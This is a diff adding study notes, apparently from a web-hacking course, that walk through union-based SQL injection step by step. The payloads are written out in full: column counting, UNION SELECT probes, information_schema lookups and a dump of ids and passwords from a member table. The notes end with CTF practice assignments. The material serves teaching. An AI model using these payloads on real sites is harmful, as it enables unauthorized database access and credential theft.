@@ -26,3 +26,39 @@
 #      - order by = sort
 #      ex) select ~~~ order by [column name]
 #      ex) select id from member order by id
+
+-------------------------------------------------------------------------------------------------------
+
+# Part 4. Union SQL Injection
+#  - Union SQL Injection Process
+#  1. Find out the point of the SQL Injection
+#    1) Type the part of words    => select * from table where name like '%______%'
+#    2) over%' and '1%' = '1
+#  2. Find the number of Columns
+#    1) over%' order by 1 #       => Find out how many columns it is to type sequence numbers
+#  3. Find the number of print column location
+#    1) over%' union select 1,2,3,4 #       => It shows the displayed numbers
+#    2) select pass from member      => over%' union select 1,pass,3,4 #
+#  4. Find DB name: segault_sql
+#    1) select database()
+#    2) over%' union select 1,database(),3,4 #
+#  5. Find Table name
+#    1) information_schema.tables
+#    2) select table_name from information_schema.tables where table_schema = 'DB Name'
+#    3) over%' union select 1,table_name,3,4 from information_schema.tables where table_schema = 'segault_sql' #
+#  6. Find Column name
+#    1) select column_name from information_schema.columns where table_name = 'table name'
+#    2) over%' union select 1,column_name,3,4 from information_schema.column where table_name = 'member' #
+#  7. Find Data
+#    1) select id, pass from member
+#    2) over%' union select 1, id, pass, 4 from member
+
+-------------------------------------------------------------------------------------------------------
+
+# Assignment
+#  1. Review Union SQL Injection (HTTP://ctf.segfaulthub.com:1020/sqlInjection3.php)
+#  2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php
+#  3. CTF questions
+#  4. Web development
+#    - mypage
+
